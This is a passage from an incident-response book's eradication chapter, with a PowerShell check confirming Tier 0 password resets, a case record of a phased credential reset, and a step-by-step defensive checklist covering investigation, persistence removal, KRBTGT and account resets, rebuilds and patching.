PS C:\> Get-ADUser -Filter * -SearchBase "OU=Tier0,DC=northwind,DC=local" -Properties

PasswordLastSet |

>>     Where-Object -Property PasswordLastSet -LT (Get-Date).AddDays(-1) |

>>     Select-Object SamAccountName, PasswordLastSet 2

PS C:\> 3

1 Verify the KRBTGT password last set time matches the documentation for the 2nd password reset.

2 Verify no Tier 0 accounts have passwords older than the reset window.

3 No results returned - all Tier 0 passwords reset within the last twenty-four hours.

David documented the credential reset in the incident record:

• KRBTGT resets: Two resets completed ten hours apart, replication verified after each.

• Tier 0 accounts: 12 accounts reset, 2 temporary accounts created and subsequently disabled.

• Tier 1 accounts: 47 accounts reset, all service account dependencies documented and updated.

• Tier 2 accounts: 214 accounts reset with forced password change at next logon

• Service accounts: 83 accounts reset, backup system required vendor coordination for configuration

• Issues encountered: Backup software configuration encryption required a two-hour extension to Phase

2.

• Monitoring results: No authentication attempts using old credentials were detected during or after the

reset window.

The coordinated credential reset eliminated the attacker’s ability to use harvested credentials while

maintaining critical business operations. The phased approach allowed the trading platform to continue

operating during reduced-activity periods, and the advanced coordination with application teams

prevented service disruptions from catching anyone off guard.

ERADICATE: STEP-BY-STEP

The following steps provide a condensed reference for eradication activities. Each step corresponds to

topics covered earlier in this chapter, organized for use when investigating the presence of attackers,

removing persistence mechanisms, and remediating the conditions that enabled the attack.

This step-by-step guide is available for download in PDF and Markdown formats on the

companion website at dynamicincidentresponse.com.

Step 1. Conduct Short-Form Investigation to Inform Eradication

Short-form investigation provides the insight needed to proceed with eradication without waiting for the

full forensic picture. A parallel long-form investigation may continue throughout eradication and into

recovery to support regulatory reporting, legal proceedings, and organizational learning; the eradicate

chapter’s "Long-Form Investigation for Comprehensive Understanding" section describes the parallel track

in detail.

1. Answer important eradication questions through evidence analysis, including:

◦ What was the initial access vector? Has it been closed?

◦ What credentials were compromised? Have they been rotated?

◦ What other systems did the attacker access? Are they also targeted for eradication?

◦ What persistence mechanisms did the attacker deploy? Are they all identified?

◦ What vulnerability enabled the attack? Has it been patched?

2. Apply log investigation techniques, including:

◦ Use a portable detection-rule format with a fast event-log scanner for rapid Windows Event Log

analysis.

◦ Query SIEM platforms for indicators of compromise across all ingested log sources.

◦ Correlate authentication logs, application logs, and network flow data.

◦ Add eradication-sequencing markers to the attack timeline produced during scope, identifying

when each persistence mechanism was deployed so removal can proceed in safe order. Building the

canonical attack-progression timeline is a scope activity; eradicate annotates it.

3. Conduct live investigation on contained systems, including:

◦ Enumerate running processes, network connections, and system configuration.

◦ Apply differential analysis comparing the current state against known-good baselines to identify

new services, scheduled tasks, and accounts.

◦ Document findings systematically for eradication planning.

4. Perform a memory investigation when deeper analysis is required, including:

◦ Analyze the memory captured during contain using a memory forensics framework to examine

processes, network connections, and loaded drivers. Volatile data collection is itself a contain

activity. If memory was not captured during contain, capture it now with a whole-system memory

acquisition tool before proceeding with analysis.

◦ Identify injected code using process-memory analysis techniques.

◦ Extract command-line arguments and handles to understand attacker objectives.

5. Analyze network data to map attacker communications, including:

◦ Review packet captures, NetFlow data, and firewall logs for lateral movement patterns.

◦ Examine DNS logs for command-and-control domain lookups.

◦ Visualize cloud network connection graphs from flow log data.

◦ Identify data exfiltration indicators through volume analysis and destination review.

6. Use EDR platforms for centralized endpoint investigation, including:

◦ Query EDR consoles to scope attacker activity across multiple endpoints.

◦ Correlate EDR alerts with findings from log, memory, and network investigation.

7. Conduct malware investigation when malicious files are identified, including:

◦ Perform static analysis: file hashing, string extraction, PE structure analysis, and cross-referencing

with threat intelligence platforms.

◦ Perform dynamic analysis in isolated environments: execute malware with system-monitoring tools

and review sandbox reports from automated analysis platforms.

◦ Identify artifacts created by the malware (files, registry keys, processes) and persistence

mechanisms requiring removal.

◦ Extract network IOCs (C2 domains, IP addresses) for containment and continued scoping.

8. Investigate Business Email Compromise (BEC) when email-based attacks are suspected, including:

◦ Enumerate mailbox rules and forwarding configurations on affected accounts.

◦ Review organization-level mail flow and transport rules for unauthorized changes.

◦ Enumerate OAuth application permissions and third-party integrations.

◦ Analyze sign-in logs for impossible travel patterns and suspicious authentication activity.

◦ Coordinate with finance and accounting teams to trace fraudulent transactions during the

compromise window.

9. Investigate insider threats when authorized users are involved, including:

◦ Coordinate closely with HR, legal, and company leadership before beginning the investigation.

◦ Focus on data access patterns, privilege changes, and exfiltration methods.

◦ Look for remote access tools, secondary accounts, or modified system configurations that could

allow continued access.

◦ Document findings meticulously for potential legal proceedings.

10. Investigate supply chain compromises when trusted channels are involved, including:

◦ For software supply chain incidents, identify all systems with the compromised software version and

review vendor IOCs.

◦ For hardware supply chain incidents, document serial numbers, procurement sources, and shipping

chains.

◦ For service provider compromises, identify all access points the compromised partner has to the

environment and review authentication logs for unusual activity.

◦ Coordinate with the compromised supplier or partner to share investigation findings.

11. Investigate cloud environments for IaaS and SaaS compromises, including:

◦ Review cloud audit logs for unauthorized API calls and IAM modifications.

◦ Apply differential analysis comparing the deployed state against IaC definitions or documented

baselines.

◦ Investigate IAM roles, assume-role trust relationships, and cross-account access for unauthorized

changes.

◦ Review storage access logs, serverless function deployments, and container image modifications.

◦ For SaaS compromises, request activity reports from the provider and review integration logs from

connected on-premises systems.

◦ Enumerate privileges and OAuth applications within SaaS environments for persistence

mechanisms.

Step 2. Perform Root Cause Analysis

1. Identify the root cause of the incident, including:

◦ Trace the attack chain back to the initial compromise point.

◦ Distinguish between immediate causes and underlying root causes.

◦ Document the sequence of events that enabled the attacker’s access.

◦ Identify systemic weaknesses that allowed the attack to succeed.

2. Use structured analysis techniques, including:

◦ Apply fishbone diagram mapping to categorize contributing factors across the four P’s: People,

Process, Product, and Policy.

◦ Alternatively, use the Five Whys technique for focused, linear root cause analysis.

◦ Engage relevant stakeholders from IT, security, and business units.

◦ Validate findings against collected evidence.

3. Document root cause findings for remediation planning, including:

◦ Record specific vulnerabilities, misconfigurations, or process failures.

◦ Identify preventive measures to address each contributing factor.

◦ Prioritize remediation based on risk and feasibility.

◦ Feed findings into both immediate eradication and long-term security improvements.

Step 3. Remove Persistence Mechanisms

1. Address Windows persistence mechanisms, including:

◦ Use a consolidated autostart enumeration tool to list persistence locations in a single view and

compare against known-good baselines.

◦ Examine registry Run keys (HKLM and HKCU \Software\Microsoft\Windows\CurrentVersion\Run).

◦ Review scheduled tasks for unauthorized entries.

◦ Check services for unauthorized entries.

◦ Examine startup folders, WMI event subscriptions, and DLL search order hijacking.

◦ Review the Group Policy for malicious scripts or software deployment.

2. Address Linux persistence mechanisms, including:

◦ Review cron jobs in /etc/crontab, /etc/cron.d/, and user crontabs, and review pending at jobs.

◦ Examine systemd services in /etc/systemd/system/ and user service directories.

◦ Check shell initialization files (.bashrc, .profile, /etc/profile.d/).

◦ Review authorized_keys files for unauthorized SSH access.

◦ Examine kernel module and library preloading configurations (/etc/ld.so.preload and LD_PRELOAD).

◦ Review PAM modules in /etc/pam.d/ for backdoors.

◦ Check for unauthorized SUID/SGID binaries and sudo configuration changes.

◦ Review package manager hooks, git hooks, and udev rules for malicious entries.

3. Remove service and application persistence mechanisms, including:

◦ Search for files with suspicious characteristics (encoded content, eval functions).

◦ Compare web directories against known-good baselines.

◦ Review web server logs for access patterns to suspicious files.

◦ Verify file integrity against deployment manifests or version control.

4. Address cloud persistence mechanisms, including:

◦ Review IAM users, roles, and policies for unauthorized access grants.

◦ Examine serverless functions, container images, and event triggers.

◦ Check for unauthorized API keys, access tokens, and service account credentials.

◦ Review resource policies, bucket policies, and cross-account access configurations.

◦ Audit OAuth application registrations and consent grants.

Step 4. Remediate Accounts and Identity Systems

This step addresses the identity system as a whole, including the blast-radius accounts revealed during

scope and the deeper identity primitives (KRBTGT, trust passwords, delegation, hybrid AD/Entra) that are

out of scope for contain. The known-compromised set is already invalidated during contain; Step 4 picks up

from there and works outward.

1. Remediate local accounts and credentials across the expanded scope identified after contain, including:

◦ Remove unauthorized local accounts from affected systems.

◦ Reset passwords for additional legitimate accounts revealed during scope as having been touched,

beyond the known-compromised set already reset during contain.

◦ Clear cached credentials from LSASS, browser stores, and credential managers.

◦ Rotate local administrator passwords using a managed local-administrator password solution.

2. Remediate Active Directory accounts and credentials, expanding remediation across the AD

environment, including:

◦ Follow Microsoft’s tier model (Tier 0, Tier 1, Tier 2) for prioritization.

◦ Reset passwords for compromised accounts, starting with those with the highest privilege, including

accounts revealed during scope that contain did not address.

◦ Review and remove unauthorized group memberships.

◦ Audit and reset service account credentials with application team coordination.

3. Reset the KRBTGT account when a Kerberos compromise is suspected:

◦ Perform the KRBTGT password reset twice, with ten-plus-hour delay between resets.

◦ Verify replication completion across all domain controllers after each reset.

◦ In multi-domain forests, reset the KRBTGT in the child domains before resetting it in the parent

domains.

◦ Monitor for authentication failures indicating active Golden Ticket usage.

◦ Document reset timing for compliance and incident records.

4. Reset domain controller machine account passwords:

◦ Reset each domain controller’s machine account password individually after completing KRBTGT

resets.

◦ Allow replication to complete between machine account resets.

5. Reset trust passwords when inter-domain or inter-forest trusts are involved:

◦ Reset trust passwords on the trusting side of each affected trust relationship.

◦ Verify trust functionality after reset.

6. Disable unconstrained delegation where not strictly required, including:

◦ Identify computer and user objects with unconstrained delegation using directory-query tooling

appropriate to the environment.

◦ Disable unconstrained delegation on objects that do not require it.

◦ Migrate to constrained or resource-based constrained delegation where delegation is needed.

7. Address hybrid and cloud identity systems, including:

◦ Coordinate remediation across on-premises AD and Entra ID.

◦ Revoke all refresh tokens and active sessions for compromised users in the cloud IdP.

◦ Reset passwords in both environments, accounting for synchronization delays.

◦ Review and remove malicious Entra ID application registrations.

◦ Verify that the Entra Connect synchronization rules have not been modified and reset the

synchronization service account credentials.

◦ Audit federated identity provider configurations for unauthorized changes.

8. Extend session and token revocation to the expanded account set (contain Step 2 already revoked

sessions and tokens for the known-compromised set), including:

◦ Force termination of active sessions through the identity provider for additional accounts identified

during scope.

◦ Revoke OAuth refresh and access tokens, personal access tokens, and API keys for the expanded

account set.

◦ Rotate service credentials and API keys for service accounts revealed during scope, and update

dependent applications.

◦ Clear browser-stored credentials, authentication cookies, and session tokens on systems newly

identified as touched by the attacker.

◦ Monitor for token reuse attempts across both the contain-era and eradicate-era revocation sets.

Step 5. Execute Targeted Removal or Rebuild

1. Choose an appropriate eradication strategy:

◦ Targeted removal: Remove specific malware and persistence when the scope is well-understood.

◦ Full rebuild: Reinstall from clean media when the compromise scope is uncertain.

◦ Restore from backup: Use verified, clean backups when available and validated.

2. Validate the eradication method, including:

◦ Confirm a clean backup exists for the backup-restore path (the per-system backup integrity

validation at restore time is a recover Step 1 activity).

◦ Ensure root cause is addressed before rebuilding or restoring systems to prevent reinfection.

◦ Test rebuilt systems in an isolated environment before handing them to recover for production

validation testing.

◦ Document the eradication method and validation steps for each system.

Step 6. Remediate Vulnerabilities

1. Identify and patch exploited vulnerabilities, including:

◦ Map exploited vulnerabilities to CVE identifiers where applicable.

◦ Cross-reference with the CISA Known Exploited Vulnerabilities catalog.

◦ Prioritize patches for vulnerabilities actively exploited in the incident.
